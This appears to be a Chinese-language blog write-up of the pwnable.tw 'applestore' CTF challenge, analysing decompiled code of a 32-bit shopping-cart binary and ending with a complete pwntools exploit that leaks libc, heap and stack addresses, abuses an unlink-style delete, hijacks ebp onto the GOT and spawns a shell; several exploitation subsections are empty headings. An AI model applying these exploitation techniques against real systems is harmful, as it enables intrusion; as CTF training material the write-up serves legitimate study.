---
title: 和媳妇一起学Pwn 之 applestore
date: 2020-03-06 00:00:00
categories:
- CTF/Pwn
tags: pwnable.tw matlab 劫持ebp 栈堆结合 未初始化变量
---

> 漏洞点是：本题预留了一个彩蛋，触发后可将一块栈内存的地址记录到堆上，并且可通过一些函数的输入控制这块栈内存。

> 利用方式：构造好这块栈内存后，再利用题目本身控制堆内存的一些函数便可以泄露内存数据，还可以完成有约束的地址写约束的数据。虽然因为约束关系使得直接修改GOT表后程序会崩溃，但可以通过修改栈上old_ebp内存为GOT表附近，函数leave时进而劫持栈底（ebp寄存器）到GOT表段，再通过题目本身的函数输入，控制栈内存，即控制GOT表，最终getshell。另外这题是只有malloc没有free，所以不用太关注堆本身的那套利漏洞问题和利用方法。

- 题目地址：[https://pwnable.tw/challenge/#7](https://pwnable.tw/challenge/#7)  
- 参考WP：[pwnable.tw系列](https://n0va-scy.github.io/2019/07/03/pwnable.tw/)

## 检查

```bash
➜   file applestore 
applestore: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=35f3890fc458c22154fbc1d65e9108a6c8738111, not stripped
➜   checksec applestore
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

题目基本信息：32位，动态链接，没去符号，没开PIE，GOT表可写，给了libc

## 分析

运行发现是菜单题，苹果的购物商店，有这些功能：列菜单，加入购物车，从购物车中删除，查看购物车，去收银台，退出

```bash
➜   ./applestore 
=== Menu ===
1: Apple Store
2: Add into your shopping cart
3: Remove from your shopping cart
4: List your shopping cart
5: Checkout
6: Exit
```
但尝试发现，挑好东西去收银台人家总不让我结账，总让我下次再结账：

```bash
=== Menu ===
1: Apple Store
2: Add into your shopping cart
3: Remove from your shopping cart
4: List your shopping cart
5: Checkout
6: Exit
> 2
Device Number> 1
You've put *iPhone 6* in your shopping cart.
Brilliant! That's an amazing idea.
> 5
Let me check your cart. ok? (y/n) > y
==== Cart ====
1: iPhone 6 - $199
Total: $199
Want to checkout? Maybe next time!
```

那好吧，我不买了，我还是IDA分析吧：

```asm
0x08048cb7 <+17>:	mov    DWORD PTR [esp],0xe
0x08048cbe <+24>:	call   0x80484c0 <signal@plt>
0x08048cc3 <+29>:	mov    DWORD PTR [esp],0x3c
0x08048cca <+36>:	call   0x80484d0 <alarm@plt>
```

发现main函数里有时间限制的方法，我们把这两个函数调用patch掉，然后继续分析：

### main

首先main函数会初始化一个全局变量myCart为0，这个变量位于bss段，大小为0x10，然后打印menu，然后进入handler函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  memset(&myCart, 0, 0x10u);
  menu();
  return handler();
}
```


### handler

handler函数会调用my_read函数，读取用户输入到栈上，大小为0x15字节。然后用户的输入将会被送入到atoi函数中转换为整型，说明my_read读到栈上的用户输入为ascii字符串，然后根据结果执行对应的功能

```c
unsigned int handler()
{
  char nptr; // [esp+16h] [ebp-22h]
  unsigned int v2; // [esp+2Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  while ( 1 )
  {
    printf("> ");
    fflush(stdout);
    my_read(&nptr, 0x15u);
    switch ( atoi(&nptr) )
    {
      case 1:
        list();
        break;
      case 2:
        add();
        break;
      case 3:
        delete();
        break;
      case 4:
        cart();
        break;
      case 5:
        checkout();
        break;
      case 6:
        puts("Thank You for Your Purchase!");
        return __readgsdword(0x14u) ^ v2;
      default:
        puts("It's not a choice! Idiot.");
        break;
    }
  }
}
```

### my_read

my_read函数除了调用read函数进行输入，做了基本的边界处理，在handler函数中，nptr与canary的变量v2相差0x16个字节，所以这里的最后补零不会破坏canary变量。

```c
char *__cdecl my_read(void *buf, size_t nbytes)
{
  char *result; // eax
  ssize_t v3; // [esp+1Ch] [ebp-Ch]

  v3 = read(0, buf, nbytes);
  if ( v3 == -1 )
    return (char *)puts("Input Error.");
  result = (char *)buf + v3;
  *((_BYTE *)buf + v3) = 0;
  return result;
}
```

### add

list函数没啥说的，就是一堆打印，我们直接看add函数，还是通过my_read函数往栈上的内存写用户的输入，然后用过atoi进行转换，然后调用了creat和insert函数完成了往购物的添加功能

```c
unsigned int add()
{
  _DWORD *v1; // [esp+1Ch] [ebp-2Ch]
  char nptr; // [esp+26h] [ebp-22h]
  unsigned int v3; // [esp+3Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Device Number> ");
  fflush(stdout);
  my_read(&nptr, 0x15u);
  switch ( atoi(&nptr) )
  {
    case 1:
      v1 = (_DWORD *)create("iPhone 6", 199);
      insert(v1);
      goto LABEL_8;
    case 2:
      v1 = (_DWORD *)create("iPhone 6 Plus", 299);
      insert(v1);
      goto LABEL_8;
    case 3:
      v1 = (_DWORD *)create("iPad Air 2", 499);
      insert(v1);
      goto LABEL_8;
    case 4:
      v1 = (_DWORD *)create("iPad Mini 3", 399);
      insert(v1);
      goto LABEL_8;
    case 5:
      v1 = (_DWORD *)create("iPod Touch", 199);
      insert(v1);
LABEL_8:
      printf("You've put *%s* in your shopping cart.\n", *v1);
      puts("Brilliant! That's an amazing idea.");
      break;
    default:
      puts("Stop doing that. Idiot!");
      break;
  }
  return __readgsdword(0x14u) ^ v3;
}
```

### create

create函数申请0x10的内存，实际返回的堆块大小为0x18，因为0x10大小的堆块最大存储用户数据为0xc，32位下再大一点的堆块大小就是0x18，可以存储的数据的空间为0x14，满足用户请求

```c
char **__cdecl create(int a1, char *a2)
{
  char **v2; // eax
  char **v3; // ST1C_4

  v2 = (char **)malloc(0x10u);
  v3 = v2;
  v2[1] = a2;
  asprintf(v2, "%s", a1);
  v3[2] = 0;
  v3[3] = 0;
  return v3;
}
```

可以看到，这里IDA给出的结果中，v2和v3其实是一个变量，所以可以在v3变量出点右键，选择`map to another variable`（快捷键=），选择v2，即可使得结果更好看：

```c
char **__cdecl create(int a1, char *a2)
{
  char **v2; // eax MAPDST

  v2 = (char **)malloc(0x10u);
  v2[1] = a2;
  asprintf(v2, "%s", a1);
  v2[2] = 0;
  v2[3] = 0;
  return v2;
}
```

create函数的第一个参数为手机名字的字符串常量，第二个参数为对应的手机价格。其中调用了asprintf这个函数，这个函数可以根据格式化字符串的最终结果长度自动的申请堆空间的内存，存放字符串，并且将字符串地址赋值给第一个参数。不过通过这种方式申请的堆空间需要用户手动释放。所以可以看到create函数，申请16字节的内存，前4个字节存放了asprintf自动申请，存储手机名的堆的地址，然后4个字节存放的是整型的手机价格，后面的8个字节都是0，用来做什么暂时不知道。返回值为堆块的数据部分的地址，然后add函数将这个地址传入到insert中

### insert

insert函数这个循环刚开始就看的有点迷糊，不过我们从开始的情景来推演就明白了这个循环是干嘛的了：

```c
int __cdecl insert(int a1)
{
  int result; // eax
  _DWORD *i; // [esp+Ch] [ebp-4h]

  for ( i = &myCart; i[2]; i = (_DWORD *)i[2] )
    ;
  i[2] = a1;
  result = a1;
  *(_DWORD *)(a1 + 12) = i;
  return result;
}
```

- 第一次购买手机加入购物车时，myCart往后这0x10字节的内存（位于bss段）都是0。所以i就是myCart的地址，`i[2]`为0，跳出循环。然后将`i[2]`也就是`*(&myCart+2)`赋值为create返回的堆块的地址。然后将堆块偏移12即，堆块最后4个字节赋值为i，即&myCart。
- 第二次购买手机加入购物车时，for循环第一次不跳出，因为上一次`i[2]`有值，为上一次create的堆块的地址，所以根据for的赋值语句，i赋值为上一个堆块的起始地址，然后将`i[2]`，也就是上一个堆块的第三个4字节赋值为当前堆块的首地址。最后将当前堆块的最后四个字节赋值为前一个堆块的首地址。
- 以此类推，大概明白了，myCart是16个字节，每次create的堆块也是16个字节，insert相当于把每次添加进购物车的手机组织成一个不循环的双链表，每次添加一个手机就是往双链表最后添加一个节点，具体这个双链表的数据结构我们之后讨论

### delete

猜也猜到了，双链表的摘除，类似unlink

```c
unsigned int delete()
{
  signed int v1; // [esp+10h] [ebp-38h]
  _DWORD *v2; // [esp+14h] [ebp-34h]
  int v3; // [esp+18h] [ebp-30h]
  int v4; // [esp+1Ch] [ebp-2Ch]
  int v5; // [esp+20h] [ebp-28h]
  char nptr; // [esp+26h] [ebp-22h]
  unsigned int v7; // [esp+3Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  v1 = 1;
  v2 = (_DWORD *)dword_804B070;
  printf("Item Number> ");
  fflush(stdout);
  my_read(&nptr, 0x15u);
  v3 = atoi(&nptr);
  while ( v2 )
  {
    if ( v1 == v3 )
    {
      v4 = v2[2];
      v5 = v2[3];
      if ( v5 )
        *(_DWORD *)(v5 + 8) = v4;
      if ( v4 )
        *(_DWORD *)(v4 + 12) = v5;
      printf("Remove %d:%s from your shopping cart.\n", v1, *v2);
      return __readgsdword(0x14u) ^ v7;
    }
    ++v1;
    v2 = (_DWORD *)v2[2];
  }
  return __readgsdword(0x14u) ^ v7;
}
```

假如p为指向要删除的节点的指针，则内存的变化，可抽象的表示：

```c
p -> fd -> bk = p -> bk
p -> bk -> fd = p -> fd
```

加上这个节点本身的数据结构的条件，内存的变化即为：

```c
fd[3]=bk
bk[2]=fd
```

### cart

确认输入的是不是字符y，如果是，则遍历双链表打印购物车内容，返回购物车内商品总价格

```c
int cart()
{
  signed int v0; // eax
  signed int v2; // [esp+18h] [ebp-30h]
  int v3; // [esp+1Ch] [ebp-2Ch]
  _DWORD *i; // [esp+20h] [ebp-28h]
  char buf; // [esp+26h] [ebp-22h]
  unsigned int v6; // [esp+3Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  v2 = 1;
  v3 = 0;
  printf("Let me check your cart. ok? (y/n) > ");
  fflush(stdout);
  my_read(&buf, 0x15u);
  if ( buf == 121 )
  {
    puts("==== Cart ====");
    for ( i = (_DWORD *)dword_804B070; i; i = (_DWORD *)i[2] )
    {
      v0 = v2++;
      printf("%d: %s - $%d\n", v0, *i, i[1]);
      v3 += i[1];
    }
  }
  return v3;
}
```

### checkout

调用cart，可以打印购物的的内容，然后如果总价格为7174，则可以将1美元的iphone8添加到购物车里，v2存储asprintf出来的字符串地址，v3为价格。

```c
unsigned int checkout()
{
  int v1; // [esp+10h] [ebp-28h]
  char *v2; // [esp+18h] [ebp-20h]
  int v3; // [esp+1Ch] [ebp-1Ch]
  unsigned int v4; // [esp+2Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  v1 = cart();
  if ( v1 == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf(&v2, "%s", "iPhone 8");
    v3 = 1;
    insert((int)&v2);
    v1 = 7175;
  }
  printf("Total: $%d\n", v1);
  puts("Want to checkout? Maybe next time!");
  return __readgsdword(0x14u) ^ v4;
}
```

然后调用insert传入v2变量的地址，不过注意之前双链表里存放的都是堆块，这次存了栈空间的地址上去，会不会有问题呢？不过首先是如何触发这个if呢，总价格达到7174，iphone的售价分别是199，299，399，499。所以这是一个多元一次方程求整数解，据说用z3非常好求解，不过没安装明白，最后还是用matlab求解的：

```python
>> [a,b,c,d]=ndgrid(0:100,0:100,0:100,0:100);
F=a*199+b*299+c*399+d*499;
ind=find(F(:)==7174);
[a(ind) b(ind) c(ind) d(ind)]

ans =

     6    20     0     0
     7    18     1     0
     8    16     2     0
     9    14     3     0
    10    12     4     0
>> 
```

解出一堆整数解，这里有所省略


## 数据结构

本题设计了一个双链表，每个链表的节点是16字节，存在4个元素，分别为手机名字的字符串地址(&name)，手机价格(price)，链表前向指针(fd)，链表后向指针(bk)，理解这个数据结构是明白本题的关键。当已经加入了一些手机到购物车后，myCart这个位于bss段的节点，充当双链表的表头，其后的节点均为堆空间的内存块：


![image](https://xuanxuanblingbling.github.io/assets/pic/applestore/mycart.png)


然后是主要用到这个数据结构的几个函数：

- add: 完成双链表节点的插入
- delete: 完成双链表节点的删除
- cart: 完成双链表节点的遍历，打印每个节点的第一个元素指向的字符串
- checkout: 可以完成双链表节点的遍历，触发彩蛋可以完成一次双链表节点的插入，而且节点位于栈上

## 漏洞点

刚才看到在checkout触发彩蛋后，可以添加一个栈上的内存空间，到购物车双链表中，我们先来尝试一下，在本地触发一次这个彩蛋，采用matlab算出的第一个解买6个199的，买20个299的：

```python
from pwn import *
context(arch='i386',os='linux',log_level='debug')
myelf = ELF('applestore')
io = process(myelf.path)

add = '2';delete='3';cart='4';checkout='5'
def action(num,payload):
        io.sendlineafter('> ',num)
        io.sendlineafter('> ',payload)

for i in range(6):
        action(add,'1')
for i in range(20):
        action(add,'2')
action(checkout,'y')

io.recv()
io.interactive()
```

执行一下可以发现，的确触发了：

```c
'18: iPhone 6 Plus - $299\n'
'19: iPhone 6 Plus - $299\n'
'20: iPhone 6 Plus - $299\n'
'21: iPhone 6 Plus - $299\n'
'22: iPhone 6 Plus - $299\n'
'23: iPhone 6 Plus - $299\n'
'24: iPhone 6 Plus - $299\n'
'25: iPhone 6 Plus - $299\n'
'26: iPhone 6 Plus - $299\n'
'*: iPhone 8 - $1\n'
```
不过在脚本最后我用的`io.interactive()`，我们可以继续跟程序交互，我们再次执行4号选项，即打印购物车列表，发现程序崩溃了：

```bash
26: iPhone 6 Plus - $299
27: WVS\x83�D$\x1c\x8bL$\x18f\x83x\x0e - $-137035168
[*] Process '/mnt/hgfs/pwn/pwnable/applestore/applestore' stopped with exit code -11 (SIGSEGV) (pid 54135)
[*] Got EOF while reading in interactive
```

这其实是因为，我们加入到链表中的栈地址的iphone8的数据已经失效了，这段栈空间被其他的函数所利用，所以是失效的数据，在执行cart的过程中，需要访问每一个节点的第一个元素的地址，如果是错误的数据，很有可能这个地址处于不可访问的内存，导致程序崩溃。这也就是本题的漏洞所在！

## 利用

本题的精髓都在利用上了，这个利用真是太巧妙了。

### 栈平衡与计算

以往我们熟悉的栈操作都是在一个函数内，比如函数内的局部变量距离ebp的偏移，直接用IDA看就可以了。但是如果出了这个函数后，这个未清空的原来的变量的栈地址，被别的函数利用了，这里有三个问题：

1. 原来的变量距离现在的ebp的偏移是固定的么？
2. 如果是，这个偏移和距离原来ebp的偏移是相同的么？
3. 如果不是，这个偏移怎么计算？

### 泄露libc基址和heap段地址

### 泄露栈地址

### delete一次有约束的地址写

### 劫持ebp并覆盖GOT表

### 完整exp

```python
from pwn import *
context(arch='i386',os='linux',log_level='debug')
myelf = ELF('applestore')
libc = ELF("./libc_32.so.6")
io = remote("chall.pwnable.tw",10104)
add = '2';delete='3';cart='4';checkout='5'

def action(num,payload):
        io.sendlineafter('> ',num)
        io.sendlineafter('> ',payload)
for i in range(6):
        action(add,'1')
for i in range(20):
        action(add,'2')

action(checkout,'y')
payload = 'y\x00'+p32(myelf.got['puts'])+p32(1)+p32(0x0804B070)+p32(1)
action(cart,payload)
io.recvuntil('27: ')
libc_addr = u32(io.recv(4))-libc.symbols['puts']
io.recvuntil('28: ')
heap_addr = u32(io.recv(4))-0x490
payload = 'y\x00'+p32(heap_addr+0x8b0)+p32(1)+p32(0x0804B070)+p32(1)
action(cart,payload)
io.recvuntil('27: ')
stack_addr = u32(io.recv(4))+0x20
for i in range(25):
        action(delete,'1')
#payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(stack_addr-0xc)+p32(myelf.got['asprintf']+0x22)
payload = '2\x00'+p32(myelf.got['puts'])+p32(1)+p32(myelf.got['asprintf']+0x22)+p32(stack_addr-0x8)
action(delete,payload)
payload = 'sh\x00\x00'+p32(libc_addr+libc.symbols['system'])
io.sendlineafter("> ",payload)
log.warn('libc_addr: %x' % libc_addr)
log.debug('heap_addr: %x' % heap_addr)
log.debug('stack_addr: %x' % stack_addr)

# gdb.attach(io,"b * 0x8048beb")
io.interactive()
```